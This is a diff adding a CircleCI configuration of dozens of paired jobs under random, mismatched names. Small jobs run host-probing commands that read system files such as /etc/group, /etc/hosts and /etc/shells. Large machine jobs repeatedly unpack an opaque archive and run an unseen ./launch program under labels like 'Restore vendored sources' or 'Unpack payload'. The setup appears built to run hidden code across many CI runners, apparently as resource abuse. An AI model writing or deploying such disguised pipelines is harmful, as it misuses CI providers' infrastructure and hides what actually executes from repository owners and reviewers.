@@ -1,0 +1,1663 @@
+version: 2.1
+
+jobs:
+  lkj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-5 hash
+          command: |
+            mkdir -p /tmp/build-tree
+            set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50000;i++) {ch=sprintf("%c",97+i%26); print i, ch, ch ch ch}}' > /tmp/build-tree/sha_8c29e82; true
+            echo "stage ok: b=$(wc -c </tmp/build-tree/sha_8c29e82), l=$(wc -l </tmp/build-tree/sha_8c29e82), w=$(wc -w </tmp/build-tree/sha_8c29e82)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'sha_8c29e82'
+  ValidateImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/sha_8c29e82 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  Type-Bundle-Provider:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Aiko does the publish
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; truncate -s 1M ${TMPDIR:-/tmp}/alphadaily.list && ls -l ${TMPDIR:-/tmp}/alphadaily.list; true ; } > /tmp/build-tree/NOISE_MOTH_BACKUP_FLAME
+            echo "stage ok: b=$(wc -c </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME), l=$(wc -l </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME), w=$(wc -w </tmp/build-tree/NOISE_MOTH_BACKUP_FLAME)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'NOISE_MOTH_BACKUP_FLAME'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/NOISE_MOTH_BACKUP_FLAME 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  tr_mn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Approval perf
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; for item in {4..1}; do sleep 0.1; echo "${item}"; done | nl; true ; } > /tmp/build-tree/DJI83752
+            echo "stage ok: b=$(wc -c </tmp/build-tree/DJI83752), l=$(wc -l </tmp/build-tree/DJI83752), w=$(wc -w </tmp/build-tree/DJI83752)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'DJI83752'
+  QA_MERGE_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/DJI83752 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  fill-gold:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Wrangle staging table
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; ls -n -1 -p / | tail -4; true ; } > /tmp/build-tree/GOPR-53468
+            echo "stage ok: b=$(wc -c </tmp/build-tree/GOPR-53468), l=$(wc -l </tmp/build-tree/GOPR-53468), w=$(wc -w </tmp/build-tree/GOPR-53468)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'GOPR-53468'
+  feat-3412:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/GOPR-53468 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  lightning-old-socket-tree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: CC Ines
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; echo "1 2 3 4 5" | sha256sum | cut -c1-16; true ; } > /tmp/build-tree/MRRE
+            echo "stage ok: b=$(wc -c </tmp/build-tree/MRRE), l=$(wc -l </tmp/build-tree/MRRE), w=$(wc -w </tmp/build-tree/MRRE)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'MRRE'
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/MRRE 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  js-input-link:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: RISKY remittance
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; if grep -q "^root" /etc/group;then echo Y; else echo N; fi; true ; } > /tmp/build-tree/dustyfenmuondelta
+            echo "stage ok: b=$(wc -c </tmp/build-tree/dustyfenmuondelta), l=$(wc -l </tmp/build-tree/dustyfenmuondelta), w=$(wc -w </tmp/build-tree/dustyfenmuondelta)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'dustyfenmuondelta'
+  go-live:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/dustyfenmuondelta 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  dumpCountForKey:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Over to Felix
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf '%s\n' 'lima prague' | awk '{n=split($0, a, ""); print n}'; true ; } > /tmp/build-tree/b5528403-cfa0-2596-3251
+            echo "stage ok: b=$(wc -c </tmp/build-tree/b5528403-cfa0-2596-3251), l=$(wc -l </tmp/build-tree/b5528403-cfa0-2596-3251), w=$(wc -w </tmp/build-tree/b5528403-cfa0-2596-3251)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'b5528403-cfa0-2596-3251'
+  check-production-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/b5528403-cfa0-2596-3251 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  draingflearkgo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Then bind the wifi mesh
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; awk '{print $1}' /etc/hosts | shuf -n 3; true ; } > /tmp/build-tree/surge-51gn41
+            echo "stage ok: b=$(wc -c </tmp/build-tree/surge-51gn41), l=$(wc -l </tmp/build-tree/surge-51gn41), w=$(wc -w </tmp/build-tree/surge-51gn41)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'surge-51gn41'
+  refactor-7001:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/surge-51gn41 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  ortho_rect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Scatter the glossary
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; grep -r alias /etc/security 2>/dev/null|wc -l; true ; } > /tmp/build-tree/dv8tGil0irS0MG1jzM0615
+            echo "stage ok: b=$(wc -c </tmp/build-tree/dv8tGil0irS0MG1jzM0615), l=$(wc -l </tmp/build-tree/dv8tGil0irS0MG1jzM0615), w=$(wc -w </tmp/build-tree/dv8tGil0irS0MG1jzM0615)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'dv8tGil0irS0MG1jzM0615'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/dv8tGil0irS0MG1jzM0615 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  pbFILE:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Maximise the search box
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; test -d /nonexistent && echo "true"||echo false; true ; } > /tmp/build-tree/85.174.46.206
+            echo "stage ok: b=$(wc -c </tmp/build-tree/85.174.46.206), l=$(wc -l </tmp/build-tree/85.174.46.206), w=$(wc -w </tmp/build-tree/85.174.46.206)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '85.174.46.206'
+  whiskey-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/85.174.46.206 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  setup_param_test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: The enzyme mix is sealed by Bea
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf '%s\n' "task 1 of 3" | tr ' ' '\n' | sort; true ; } > /tmp/build-tree/otter430
+            echo "stage ok: b=$(wc -c </tmp/build-tree/otter430), l=$(wc -l </tmp/build-tree/otter430), w=$(wc -w </tmp/build-tree/otter430)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'otter430'
+  Package_App7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/otter430 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  user_flatten_line:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Plan Hidden Orchard
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; cat /etc/profile|grep --ignore-case --invert-match fi; true ; } > /tmp/build-tree/debug.log.29
+            echo "stage ok: b=$(wc -c </tmp/build-tree/debug.log.29), l=$(wc -l </tmp/build-tree/debug.log.29), w=$(wc -w </tmp/build-tree/debug.log.29)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'debug.log.29'
+  sam-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/debug.log.29 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  f32fc5a249d5cb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-5 hash
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; command grep -wn -e '^/bin' /etc/shells |nl; true ; } > /tmp/build-tree/dat
+            echo "stage ok: b=$(wc -c </tmp/build-tree/dat), l=$(wc -l </tmp/build-tree/dat), w=$(wc -w </tmp/build-tree/dat)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'dat'
+  ensure-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/dat 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  counter_vec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Set sail for compression
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; echo 'disk almost full' | xargs; true ; } > /tmp/build-tree/27.10.2017
+            echo "stage ok: b=$(wc -c </tmp/build-tree/27.10.2017), l=$(wc -l </tmp/build-tree/27.10.2017), w=$(wc -w </tmp/build-tree/27.10.2017)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '27.10.2017'
+  vega-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/27.10.2017 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  TotalReader:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Compile audio banks for level 7
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; grep -R alias /etc/security 2>/dev/null|sort|head -2; true ; } > /tmp/build-tree/VID32038
+            echo "stage ok: b=$(wc -c </tmp/build-tree/VID32038), l=$(wc -l </tmp/build-tree/VID32038), w=$(wc -w </tmp/build-tree/VID32038)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'VID32038'
+  CHECK_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/VID32038 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  ref_catch:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: First total month end
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; grep -rl alias /etc/skel|tail -n 3; true ; } > /tmp/build-tree/9f6168928
+            echo "stage ok: b=$(wc -c </tmp/build-tree/9f6168928), l=$(wc -l </tmp/build-tree/9f6168928), w=$(wc -w </tmp/build-tree/9f6168928)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '9f6168928'
+  defualt-91:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/9f6168928 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  open_tax_indigo_zip_line:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Charge the vendor payments by eod
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; sed 's/=.*//' /etc/os-release | tail -n 3; true ; } > /tmp/build-tree/621d26c5d0783504711ba
+            echo "stage ok: b=$(wc -c </tmp/build-tree/621d26c5d0783504711ba), l=$(wc -l </tmp/build-tree/621d26c5d0783504711ba), w=$(wc -w </tmp/build-tree/621d26c5d0783504711ba)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '621d26c5d0783504711ba'
+  fiona-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/621d26c5d0783504711ba 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  export_ref:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Red light unload
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; sed -n 's/^ID=//p' /etc/os-release | sort -n | tail -3; true ; } > /tmp/build-tree/MVI_29884
+            echo "stage ok: b=$(wc -c </tmp/build-tree/MVI_29884), l=$(wc -l </tmp/build-tree/MVI_29884), w=$(wc -w </tmp/build-tree/MVI_29884)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'MVI_29884'
+  nightly-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/MVI_29884 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  tensorschedule:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Finally tokenize the eval metrics
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; printf %s "hi" | sha256sum | awk '{print $1}'; true ; } > /tmp/build-tree/20200418
+            echo "stage ok: b=$(wc -c </tmp/build-tree/20200418), l=$(wc -l </tmp/build-tree/20200418), w=$(wc -w </tmp/build-tree/20200418)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - '20200418'
+  API-527:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/20200418 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  grace-box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: How about the beacons
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; ln -sf /etc/os-release '/tmp/Review20220114.csv' && readlink -f '/tmp/Review20220114.csv'; true ; } > /tmp/build-tree/BOSON
+            echo "stage ok: b=$(wc -c </tmp/build-tree/BOSON), l=$(wc -l </tmp/build-tree/BOSON), w=$(wc -w </tmp/build-tree/BOSON)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'BOSON'
+  vela-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/BOSON 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  SCHEMA_PORT_36:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Balance The Boss Arena Act 3
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; for u in lima tokyo zurich toronto osaka; do echo "item: ${u}"; done | tac; true ; } > /tmp/build-tree/TXN_080289
+            echo "stage ok: b=$(wc -c </tmp/build-tree/TXN_080289), l=$(wc -l </tmp/build-tree/TXN_080289), w=$(wc -w </tmp/build-tree/TXN_080289)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'TXN_080289'
+  wip-metrics-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/TXN_080289 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  FTR-ITEM-REC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Phase Two Smoke Test
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; for w in delhi oslo madrid austin; do printf '%s\n' $w; done; true ; } > /tmp/build-tree/TICKET-18070-DK
+            echo "stage ok: b=$(wc -c </tmp/build-tree/TICKET-18070-DK), l=$(wc -l </tmp/build-tree/TICKET-18070-DK), w=$(wc -w </tmp/build-tree/TICKET-18070-DK)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'TICKET-18070-DK'
+  send-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/TICKET-18070-DK 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  monitor055:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Once the cable tray is done bail out
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; for conf in /etc/profile.d/*; do basename "${conf}";done; true ; } > /tmp/build-tree/signal548
+            echo "stage ok: b=$(wc -c </tmp/build-tree/signal548), l=$(wc -l </tmp/build-tree/signal548), w=$(wc -w </tmp/build-tree/signal548)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'signal548'
+  CORE-316:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/signal548 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  undo-migration_color:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Poll the beta testers if that is ok
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; sort -k 3 -t: -n /etc/group | cut -d: -f3; true ; } > /tmp/build-tree/c9bbad5d
+            echo "stage ok: b=$(wc -c </tmp/build-tree/c9bbad5d), l=$(wc -l </tmp/build-tree/c9bbad5d), w=$(wc -w </tmp/build-tree/c9bbad5d)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'c9bbad5d'
+  blast-off:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/build-tree
+      - run:
+          name: Capture prior
+          command: |
+            pr -t /tmp/build-tree/c9bbad5d 2>/dev/null | wc -l || true
+      - run:
+          name: Pull repository
+          command: git clone --depth 5 -q --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          command: sh -c "./launch"
+  needs_box:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Compute step-5 hash
+          command: |
+            mkdir -p /tmp/build-tree
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep -i -m 3 Dirty | sort -u; true ; } > /tmp/build-tree/bosonsweep
+            echo "stage ok: b=$(wc -c </tmp/build-tree/bosonsweep), l=$(wc -l </tmp/build-tree/bosonsweep), w=$(wc -w </tmp/build-tree/bosonsweep)"
+      - persist_to_workspace:
+          root: /tmp/build-tree
+          paths:
+            - 'bosonsweep'
+  add-parse:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
